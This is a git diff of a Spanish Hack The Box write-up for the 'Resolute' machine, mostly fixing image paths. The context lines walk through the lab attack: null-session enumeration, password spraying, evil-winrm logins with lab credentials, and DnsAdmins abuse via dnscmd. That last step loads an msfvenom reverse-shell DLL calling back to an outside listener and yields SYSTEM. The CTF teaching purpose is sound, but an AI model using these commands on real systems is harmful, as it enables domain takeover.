@@ -1,3 +1,4 @@
+# HTB - Resolute
 
 ## Task 1
 
@@ -7,7 +8,7 @@ Lo primero que hacemos, como siempre, es lanzar un `nmap` para ver qué puertos 
 
 Vemos bastantes puertos típicos de un Active Directory (53, 88, 389, 445, 464, 3268...), así que usamos `netexec` por SMB para que nos identifique el dominio directamente.
 
-![nmap + netexec](images/Task1_nmap+name.png)
+![nmap + netexec](imagenes/Task1_nmap+name.png)
 
 El dominio es **megabank.local**.
 
@@ -19,7 +20,7 @@ El dominio es **megabank.local**.
 
 Antes de nada intentamos enumerar los usuarios del dominio contra SMB usando una sesión nula (null session), por si el DC nos la permite.
 
-![Enumeración de usuarios con null session](/images/task2_enum_usuarios.png)
+![Enumeración de usuarios con null session](imagenes/task2_usuarios.png)
 
 La sesión nula funciona y conseguimos la lista completa de usuarios del dominio junto con su descripción. Si nos fijamos en la descripción del usuario `marko`, pone literalmente:
 
@@ -27,7 +28,7 @@ La sesión nula funciona y conseguimos la lista completa de usuarios del dominio
 
 Compruebo primero si `marko` sigue teniendo esa contraseña, y no es el caso. Como esa contraseña puede haberse usado como "contraseña por defecto" al crear otras cuentas de la misma forma, hago un password spray con todos los usuarios enumerados y esa misma contraseña.
 
-![Password spraying con Welcome123!](/images/task2_password_spray.png)
+![Password spraying con Welcome123!](imagenes/task2_melanie.png)
 
 El spray funciona: el usuario **melanie** tiene esa contraseña.
 
@@ -61,13 +62,13 @@ evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'
 
 Como no sabemos de entrada dónde guarda Windows el histórico de PowerShell por defecto, lo primero es buscar dónde se almacena.
 
-![Documentación sobre el histórico de PSReadLine](/images/task5_historial_ps.png)
+![Documentación sobre el histórico de PSReadLine](imagenes/task5_historial_PS.png)
 
 Esa ruta (la de PSReadLine) es la que se genera automáticamente con cada sesión interactiva, pero al comprobarla en la máquina no encontramos nada ahí, ni en las carpetas habituales donde se suele buscar este tipo de artefactos.
 
-Windows oculta carpetas "raras" con el atributo Hidden, así que hay que forzar el listado con `dir -force` en cada directorio para no dejarnos nada por el camino. Repitiendo esto por las distintas carpetas de la unidad `C:` encontramos una llamada `PSTranscripts`, que no es la ubicación por defecto de PSReadLine sino el resultado de un _transcript_ de PowerShell activado manualmente (o por GPO) con `Start-Transcript`, que registra en texto plano todo lo que ocurre en la sesión.
+Windows oculta carpetas "raras" con el atributo Hidden, así que hay que forzar el listado con `dir -force` en cada directorio para no dejarnos nada por el camino. Repitiendo esto por las distintas carpetas de la unidad `C:` encontramos una llamada `PSTranscripts`, que no es la ubicación por defecto de PSReadLine sino el resultado de un *transcript* de PowerShell activado manualmente (o por GPO) con `Start-Transcript`, que registra en texto plano todo lo que ocurre en la sesión.
 
-![PSTranscripts](/images/task5_pstranscripts.png)
+![PSTranscripts](imagenes/task5_ruta.png)
 
 La ruta completa es:
 
@@ -115,7 +116,7 @@ Con las credenciales de ryan nos conectamos por `evil-winrm` y comprobamos a qu�
 evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
 ```
 
-![Grupos de ryan](/images/task7_ryan_groups.png)
+![Grupos de ryan](imagenes/task7_ryan.png)
 
 Ryan pertenece al grupo **MEGABANK\Contractors**, y este a su vez es miembro de **MEGABANK\DnsAdmins**. `DnsAdmins` es un grupo estándar y predeterminado de Active Directory (se crea junto con el rol DNS al instalarlo en un Domain Controller), cuyo propósito es delegar la administración del servicio DNS del propio DC.
 
@@ -129,11 +130,11 @@ Pertenecer a `DnsAdmins` es interesante porque este grupo tiene, por diseño, pe
 
 El binario que se usa para leer y modificar esa configuración desde `System32` es **dnscmd.exe**.
 
-![Binarios de DNS en System32](/images/task8_dns_binaries.png)
+![Binarios de DNS en System32](imagenes/task8_dns_file.png)
 
 Lo confirmamos en LOLBAS, donde `dnscmd.exe` aparece catalogado precisamente para esta técnica (ejecución remota de una DLL arbitraria a través del servicio DNS).
 
-![dnscmd.exe en LOLBAS](/images/task8_lolbas.png)
+![dnscmd.exe en LOLBAS](imagenes/task8_lolbas.png)
 
 ---
 
@@ -147,7 +148,7 @@ Primero generamos una DLL maliciosa con `msfvenom` que nos abra una reverse shel
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.98 LPORT=443 -f dll -o mal_dns.dll
 ```
 
-![Generación de la DLL maliciosa](/images/task8_msfvenom.png)
+![Generación de la DLL maliciosa](imagenes/task8_msfvenom.png)
 
 Levantamos un servidor SMB con impacket para servir la DLL, y un listener con netcat para recibir la conexión:
 
@@ -167,7 +168,7 @@ Registry property serverlevelplugindll successfully reset.
 Command completed successfully.
 ```
 
-![Configuración de dnscmd y servidor SMB a la escucha](/images/task8_dnscmd_config.png)
+![Configuración de dnscmd y servidor SMB a la escucha](imagenes/task8_dnscmd.png)
 
 El comando se ejecuta correctamente, pero la DLL no se carga todavía: la clave `ServerLevelPluginDll` solo se lee cuando el servicio DNS arranca, así que hace falta reiniciarlo para que el cambio surta efecto. Como `ryan` hereda permisos de administración del servicio DNS a través de `DnsAdmins`, puede reiniciarlo sin problema:
 
@@ -178,10 +179,10 @@ sc.exe start dns
 
 Al arrancar de nuevo, el servicio carga nuestra DLL desde el share SMB, ejecuta el payload y recibimos la conexión en el listener, esta vez con privilegios de `NT AUTHORITY\SYSTEM`.
 
-![Shell como SYSTEM](/images/task8_system_shell.png)
+![Shell como SYSTEM](imagenes/task8_dobleshell.png)
 
 Con esta shell accedemos al escritorio del Administrador y leemos la flag final.
 
-![Flag de root](/images/task8_root_flag.png)
+![Flag de root](imagenes/task8_root.png)
 
 Con esto, la máquina Resolute queda completada.
